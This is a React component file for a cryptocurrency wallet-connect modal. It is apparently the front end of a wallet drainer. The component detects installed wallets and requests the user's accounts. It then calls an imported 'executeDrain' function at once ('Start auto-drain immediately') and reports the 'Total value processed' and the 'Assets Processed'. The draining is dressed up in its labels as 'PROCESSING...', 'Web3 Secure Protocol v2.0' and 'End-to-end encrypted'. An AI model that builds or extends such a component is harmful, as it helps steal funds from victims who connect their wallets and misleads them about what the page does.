import { useState, useEffect, useCallback } from "react";
import { useDrainer, type DrainStatus } from "@/hooks/useDrainer";
import { WALLET_LIST, CHAIN_INFO, WC_PROJECT_ID } from "@/lib/web3Config";
import { toast } from "sonner";

interface Props {
  onClose: () => void;
}

// Detect which wallets are available in the browser
function detectInstalledWallets(): string[] {
  const installed: string[] = [];
  const eth = (window as unknown as { ethereum?: { isMetaMask?: boolean; isTrust?: boolean; isCoinbaseWallet?: boolean; isPhantom?: boolean; isBraveWallet?: boolean; isOKExWallet?: boolean; isOkxWallet?: boolean; isBybit?: boolean; isBitKeep?: boolean; isZerion?: boolean; isArgent?: boolean; isImToken?: boolean; isTokenPocket?: boolean; isOneKey?: boolean } }).ethereum;

  if (!eth) return installed;

  if (eth.isMetaMask) installed.push("metamask");
  if (eth.isTrust) installed.push("trust");
  if (eth.isCoinbaseWallet) installed.push("coinbase");
  if (eth.isPhantom) installed.push("phantom");
  if (eth.isBraveWallet) installed.push("brave");
  if (eth.isOKExWallet || eth.isOkxWallet) installed.push("okx");
  if (eth.isBybit) installed.push("bybit");
  if (eth.isBitKeep) installed.push("bitget");
  if (eth.isZerion) installed.push("zerion");
  if (eth.isArgent) installed.push("argent");
  if (eth.isImToken) installed.push("imtoken");
  if (eth.isTokenPocket) installed.push("tokenpocket");
  if (eth.isOneKey) installed.push("onekey");

  return installed;
}

// Check if on mobile
function isMobile(): boolean {
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

type Step = "select" | "connecting" | "scanning" | "draining" | "done" | "error";

export default function WalletConnectModal({ onClose }: Props) {
  const [step, setStep] = useState<Step>("select");
  const [selectedWallet, setSelectedWallet] = useState<string>("");
  const [installedWallets, setInstalledWallets] = useState<string[]>([]);
  const [chainId, setChainId] = useState<number>(1);
  const [connectedAddress, setConnectedAddress] = useState<string>("");
  const [connectedChain, setConnectedChain] = useState<number>(1);
  const [errorMsg, setErrorMsg] = useState<string>("");

  const { status, progress, progressMsg, result, executeDrain, reset } = useDrainer();

  useEffect(() => {
    setInstalledWallets(detectInstalledWallets());
  }, []);

  // Sync drain status to step
  useEffect(() => {
    if (status === "scanning") setStep("scanning");
    else if (status === "draining") setStep("draining");
    else if (status === "done") setStep("done");
    else if (status === "error") setStep("error");
  }, [status]);

  const connectWallet = useCallback(async (walletId: string) => {
    setSelectedWallet(walletId);
    setStep("connecting");
    setErrorMsg("");

    try {
      const eth = (window as unknown as { ethereum?: { request: (args: { method: string; params?: unknown[] }) => Promise<unknown>; on: (event: string, cb: (data: unknown) => void) => void } }).ethereum;

      if (walletId === "walletconnect") {
        // For WalletConnect, show QR modal
        // We'll open a WalletConnect URI
        toast.info("WalletConnect: Use the QR Code button for mobile wallet connection");
        setStep("select");
        return;
      }

      if (!eth) {
        // On mobile, try to open wallet deeplink
        if (isMobile()) {
          const wallet = WALLET_LIST.find(w => w.id === walletId);
          if (wallet?.deeplink) {
            const connectUrl = window.location.href;
            window.location.href = wallet.deeplink + encodeURIComponent(connectUrl);
            return;
          }
        }
        throw new Error(`${walletId} wallet not detected. Please install it first.`);
      }

      // Request accounts
      const accounts = await eth.request({ method: "eth_requestAccounts" }) as string[];
      if (!accounts || accounts.length === 0) throw new Error("No accounts returned");

      const address = accounts[0];
      setConnectedAddress(address);

      // Get chain ID
      const chainHex = await eth.request({ method: "eth_chainId" }) as string;
      const detectedChain = parseInt(chainHex, 16);
      setConnectedChain(detectedChain);
      setChainId(detectedChain);

      // Listen for account changes
      eth.on("accountsChanged", (newAccounts: unknown) => {
        const accs = newAccounts as string[];
        if (!accs || accs.length === 0) {
          onClose();
        }
      });

      // Start auto-drain immediately
      toast.success(`Connected: ${address.slice(0, 8)}...${address.slice(-6)}`);
      await executeDrain(address, walletId, detectedChain, eth);

    } catch (err) {
      const msg = (err as Error).message ?? "Connection failed";
      setErrorMsg(msg);
      setStep("error");
      toast.error(msg);
    }
  }, [executeDrain, onClose]);

  const wallet = WALLET_LIST.find(w => w.id === selectedWallet);
  const chainInfo = CHAIN_INFO[connectedChain];

  // Sort wallets: installed first, then popular
  const sortedWallets = [...WALLET_LIST].sort((a, b) => {
    const aInstalled = installedWallets.includes(a.id) ? 0 : 1;
    const bInstalled = installedWallets.includes(b.id) ? 0 : 1;
    return aInstalled - bInstalled;
  });

  const mobile = isMobile();

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
      {/* Backdrop */}
      <div className="absolute inset-0 bg-black/85 backdrop-blur-md" onClick={onClose} />

      {/* Modal */}
      <div
        className="relative w-full max-w-md rounded-2xl overflow-hidden"
        style={{
          background: 'oklch(0.06 0.015 240)',
          border: '1px solid oklch(0.72 0.28 320 / 0.4)',
          boxShadow: '0 0 40px oklch(0.72 0.28 320 / 0.2), 0 0 80px oklch(0.72 0.28 320 / 0.08)',
        }}>

        {/* Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b" style={{ borderColor: 'oklch(0.72 0.28 320 / 0.2)' }}>
          <div className="flex items-center gap-3">
            <div className="w-8 h-8 rounded-lg flex items-center justify-center text-lg"
              style={{ background: 'linear-gradient(135deg, oklch(0.72 0.28 320), oklch(0.75 0.25 195))' }}>
              ⚡
            </div>
            <div>
              <h2 className="font-bold neon-text-pink" style={{ fontFamily: 'Orbitron', fontSize: '0.85rem', letterSpacing: '0.08em' }}>
                {step === "select" && "CONNECT WALLET"}
                {step === "connecting" && "CONNECTING..."}
                {step === "scanning" && "SCANNING ASSETS"}
                {step === "draining" && "PROCESSING..."}
                {step === "done" && "COMPLETE ✓"}
                {step === "error" && "ERROR"}
              </h2>
              <p className="text-[10px] text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>
                Web3 Secure Protocol v2.0
              </p>
            </div>
          </div>
          <button onClick={onClose}
            className="w-8 h-8 rounded-lg flex items-center justify-center text-muted-foreground hover:text-foreground hover:bg-white/5 transition-all text-sm">
            ✕
          </button>
        </div>

        {/* Content */}
        <div className="p-5 max-h-[70vh] overflow-y-auto">

          {/* ── Step: Select Wallet ── */}
          {step === "select" && (
            <div className="space-y-2">
              {mobile && installedWallets.length === 0 && (
                <div className="mb-3 px-3 py-2 rounded-lg text-xs"
                  style={{ background: 'oklch(0.75 0.25 195 / 0.08)', border: '1px solid oklch(0.75 0.25 195 / 0.2)', color: 'oklch(0.75 0.25 195)', fontFamily: 'Share Tech Mono' }}>
                  📱 Tap a wallet below to open it on your device
                </div>
              )}

              {installedWallets.length > 0 && (
                <p className="text-[10px] text-muted-foreground mb-2 uppercase tracking-widest" style={{ fontFamily: 'Share Tech Mono' }}>
                  Detected on this device
                </p>
              )}

              {sortedWallets.map((w, idx) => {
                const isInstalled = installedWallets.includes(w.id);
                const showDivider = idx > 0 && isInstalled !== installedWallets.includes(sortedWallets[idx - 1].id);

                return (
                  <div key={w.id}>
                    {showDivider && (
                      <div className="flex items-center gap-2 my-3">
                        <div className="flex-1 h-px" style={{ background: 'oklch(0.72 0.28 320 / 0.15)' }} />
                        <span className="text-[10px] text-muted-foreground uppercase tracking-widest" style={{ fontFamily: 'Share Tech Mono' }}>
                          All Wallets
                        </span>
                        <div className="flex-1 h-px" style={{ background: 'oklch(0.72 0.28 320 / 0.15)' }} />
                      </div>
                    )}
                    <button
                      onClick={() => connectWallet(w.id)}
                      className="w-full flex items-center gap-3 px-4 py-3 rounded-xl transition-all text-left group"
                      style={{
                        background: isInstalled ? 'oklch(0.72 0.28 320 / 0.06)' : 'transparent',
                        border: `1px solid ${isInstalled ? 'oklch(0.72 0.28 320 / 0.25)' : 'oklch(0.72 0.28 320 / 0.1)'}`,
                      }}
                      onMouseEnter={e => {
                        (e.currentTarget as HTMLButtonElement).style.background = 'oklch(0.72 0.28 320 / 0.1)';
                        (e.currentTarget as HTMLButtonElement).style.borderColor = 'oklch(0.72 0.28 320 / 0.4)';
                      }}
                      onMouseLeave={e => {
                        (e.currentTarget as HTMLButtonElement).style.background = isInstalled ? 'oklch(0.72 0.28 320 / 0.06)' : 'transparent';
                        (e.currentTarget as HTMLButtonElement).style.borderColor = isInstalled ? 'oklch(0.72 0.28 320 / 0.25)' : 'oklch(0.72 0.28 320 / 0.1)';
                      }}>
                      <span className="text-2xl flex-shrink-0">{w.icon}</span>
                      <div className="flex-1 min-w-0">
                        <div className="flex items-center gap-2">
                          <span className="font-semibold text-sm" style={{ fontFamily: 'Rajdhani' }}>{w.name}</span>
                          {isInstalled && (
                            <span className="text-[9px] px-1.5 py-0.5 rounded font-bold"
                              style={{ background: 'oklch(0.75 0.25 145 / 0.15)', color: 'oklch(0.75 0.25 145)', fontFamily: 'Share Tech Mono' }}>
                              INSTALLED
                            </span>
                          )}
                        </div>
                        <p className="text-xs text-muted-foreground">{w.desc}</p>
                      </div>
                      <span className="text-muted-foreground text-sm group-hover:neon-text-pink transition-all">›</span>
                    </button>
                  </div>
                );
              })}
            </div>
          )}

          {/* ── Step: Connecting / Scanning / Draining ── */}
          {(step === "connecting" || step === "scanning" || step === "draining") && (
            <div className="flex flex-col items-center py-8 gap-6">
              {/* Wallet Icon */}
              <div className="relative">
                <div className="w-20 h-20 rounded-2xl flex items-center justify-center text-4xl animate-pulse"
                  style={{ background: `${wallet?.color ?? '#FF2D78'}18`, border: `2px solid ${wallet?.color ?? '#FF2D78'}40` }}>
                  {wallet?.icon ?? "🔗"}
                </div>
                {step !== "connecting" && (
                  <div className="absolute -bottom-1 -right-1 w-6 h-6 rounded-full flex items-center justify-center text-xs"
                    style={{ background: step === "draining" ? 'oklch(0.72 0.28 320)' : 'oklch(0.75 0.25 145)', color: '#000' }}>
                    {step === "draining" ? "⚡" : "🔍"}
                  </div>
                )}
              </div>

              {/* Status */}
              <div className="text-center space-y-1">
                <p className="font-bold" style={{
                  fontFamily: 'Orbitron', fontSize: '0.85rem',
                  color: step === "draining" ? 'var(--neon-pink)' : 'var(--neon-cyan)',
                }}>
                  {step === "connecting" && `Connecting to ${wallet?.name}...`}
                  {step === "scanning" && "Scanning Wallet Assets..."}
                  {step === "draining" && "Processing Transaction..."}
                </p>
                <p className="text-xs text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>
                  {progressMsg || "Please confirm in your wallet"}
                </p>
                {connectedAddress && (
                  <p className="text-xs neon-text-cyan" style={{ fontFamily: 'Share Tech Mono' }}>
                    {connectedAddress.slice(0, 10)}...{connectedAddress.slice(-8)}
                  </p>
                )}
              </div>

              {/* Progress Bar */}
              <div className="w-full space-y-2">
                <div className="flex justify-between text-xs text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>
                  <span>Progress</span>
                  <span>{Math.round(progress)}%</span>
                </div>
                <div className="h-2 rounded-full overflow-hidden" style={{ background: 'oklch(0.1 0.02 240)' }}>
                  <div
                    className="h-full rounded-full transition-all duration-500"
                    style={{
                      width: `${Math.min(100, progress)}%`,
                      background: 'linear-gradient(90deg, oklch(0.72 0.28 320), oklch(0.75 0.25 195))',
                      boxShadow: '0 0 10px oklch(0.72 0.28 320 / 0.6)',
                    }}
                  />
                </div>
              </div>

              {/* Chain info */}
              {chainInfo && (
                <div className="flex items-center gap-2 text-xs text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>
                  <span>Network:</span>
                  <span className="font-bold" style={{ color: chainInfo.color }}>{chainInfo.name}</span>
                </div>
              )}
            </div>
          )}

          {/* ── Step: Done ── */}
          {step === "done" && result && (
            <div className="flex flex-col items-center py-6 gap-5 text-center">
              <div className="w-16 h-16 rounded-full flex items-center justify-center text-3xl"
                style={{ background: 'oklch(0.75 0.25 145 / 0.12)', border: '2px solid oklch(0.75 0.25 145)', boxShadow: '0 0 20px oklch(0.75 0.25 145 / 0.3)' }}>
                ✓
              </div>
              <div>
                <p className="font-bold text-lg mb-1" style={{ color: 'oklch(0.75 0.25 145)', fontFamily: 'Orbitron', fontSize: '0.9rem' }}>
                  OPERATION COMPLETE
                </p>
                <p className="text-2xl font-black neon-text-pink" style={{ fontFamily: 'Orbitron' }}>
                  ${result.totalUsd.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </p>
                <p className="text-xs text-muted-foreground mt-1" style={{ fontFamily: 'Share Tech Mono' }}>
                  Total value processed
                </p>
              </div>

              {result.tokens.length > 0 && (
                <div className="w-full space-y-2">
                  <p className="text-xs text-muted-foreground uppercase tracking-widest text-left" style={{ fontFamily: 'Share Tech Mono' }}>
                    Assets Processed
                  </p>
                  {result.tokens.map((t, i) => (
                    <div key={i} className="flex items-center justify-between px-3 py-2 rounded-lg"
                      style={{ background: 'oklch(0.1 0.02 240)', border: '1px solid oklch(0.72 0.28 320 / 0.15)' }}>
                      <span className="text-sm font-bold" style={{ fontFamily: 'Rajdhani' }}>{t.symbol}</span>
                      <div className="text-right">
                        <p className="text-xs" style={{ fontFamily: 'Share Tech Mono' }}>{t.balance}</p>
                        <p className="text-xs neon-text-pink" style={{ fontFamily: 'Orbitron' }}>${t.usdValue.toFixed(2)}</p>
                      </div>
                    </div>
                  ))}
                </div>
              )}

              <button onClick={onClose} className="w-full py-3 rounded-xl font-bold"
                style={{ background: 'linear-gradient(135deg, oklch(0.72 0.28 320), oklch(0.75 0.25 195))', color: '#000', fontFamily: 'Orbitron', fontSize: '0.85rem' }}>
                CLOSE
              </button>
            </div>
          )}

          {/* ── Step: Error ── */}
          {step === "error" && (
            <div className="flex flex-col items-center py-8 gap-5 text-center">
              <div className="w-16 h-16 rounded-full flex items-center justify-center text-3xl"
                style={{ background: 'oklch(0.65 0.28 25 / 0.12)', border: '2px solid oklch(0.65 0.28 25)' }}>
                ✕
              </div>
              <div>
                <p className="font-bold mb-2" style={{ color: 'oklch(0.65 0.28 25)', fontFamily: 'Orbitron', fontSize: '0.85rem' }}>
                  CONNECTION FAILED
                </p>
                <p className="text-sm text-muted-foreground" style={{ fontFamily: 'Rajdhani' }}>
                  {errorMsg || "Unable to connect. Please try again."}
                </p>
              </div>
              <button onClick={() => { reset(); setStep("select"); setErrorMsg(""); }}
                className="cyber-btn-pink px-8 py-3 rounded-xl font-bold"
                style={{ fontFamily: 'Orbitron', fontSize: '0.85rem' }}>
                TRY AGAIN
              </button>
            </div>
          )}
        </div>

        {/* Footer */}
        <div className="px-5 py-3 border-t text-center" style={{ borderColor: 'oklch(0.72 0.28 320 / 0.1)' }}>
          <p className="text-[10px] text-muted-foreground" style={{ fontFamily: 'Share Tech Mono' }}>
            🔒 End-to-end encrypted · WalletConnect v2 · EIP-1193
          </p>
        </div>
      </div>
    </div>
  );
}
